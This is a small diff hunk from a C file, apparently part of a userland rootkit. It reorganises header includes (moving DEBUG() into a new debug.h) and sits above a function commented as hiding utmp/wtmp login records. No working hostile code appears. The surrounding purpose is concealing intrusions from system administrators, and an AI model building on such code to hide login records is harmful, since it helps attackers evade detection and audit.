@@ -22,8 +22,9 @@
 #include <unistd.h> /* lseek(), read(), write(), close() */
 #include <fcntl.h> /* O_RDWR */
 #include <utmp.h> /* struct utmp */
-#include "beurk.h" /* DEBUG() */
-#include "config.h" /* REAL_OPEN */
+#include "beurk.h" /* prototype */
+#include "config.h" /* REAL_OPEN() */
+#include "debug.h" /* DEBUG() */
 
 /** hide utmp/wtmp records
  *
